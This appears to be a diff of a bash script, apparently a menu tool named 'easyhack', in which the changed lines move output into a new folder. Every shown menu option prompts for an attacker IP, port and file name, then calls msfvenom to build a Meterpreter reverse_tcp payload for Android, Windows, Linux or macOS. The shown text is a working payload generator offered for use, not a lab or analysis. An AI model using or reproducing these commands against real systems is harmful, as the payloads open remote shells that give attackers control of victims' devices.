@@ -20,25 +20,25 @@ echo "[======================================================================]"
 		read -p "Enter LHOST (IP Add.):" ip
     	read -p "Enter LPORT (Open Port): " port
     	read -p "Enter APK Name: " apk
-		msfvenom -p android/meterpreter/reverse_tcp LHOST=$ip LPORT=$port R > ~/Desktop/MyTool/$apk.apk
+		msfvenom -p android/meterpreter/reverse_tcp LHOST=$ip LPORT=$port R > ~/Desktop/easyhack/$apk.apk
 		;;
 	2)
     	read -p "Enter LPORT (Open Port): " port
     	read -p "Enter LHOST (IP Add.):" ip
     	read -p "Enter EXE Name: " exe
-		msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$port R > ~/Desktop/MyTool/$exe.exe
+		msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$port R > ~/Desktop/easyhack/$exe.exe
     	;;
 	3)
 		read -p "Enter LHOST (IP Add.):" ip
     	read -p "Enter LPORT (Open Port): " port
     	read -p "Enter File Name: " fname
-		msfvenom -p linux/meterpreter/reverse_tcp LHOST=$ip LPORT=$port R > ~/Desktop/MyTool/$fname.exe
+		msfvenom -p linux/meterpreter/reverse_tcp LHOST=$ip LPORT=$port R > ~/Desktop/easyhack/$fname.exe
     	;;
 	4)
 		read -p "Enter LHOST (IP Add.):" ip
     	read -p "Enter LPORT (Open Port): " port
     	read -p "Enter File Name: " fname
-		msfvenom -p osx/meterpreter/reverse_tcp LHOST=$ip LPORT=$port R > ~/Desktop/MyTool/$fname.exe
+		msfvenom -p osx/meterpreter/reverse_tcp LHOST=$ip LPORT=$port R > ~/Desktop/easyhack/$fname.exe
     	;;
 	5)
 		read -p "Do You Want To Exit?(Y|N) " ans
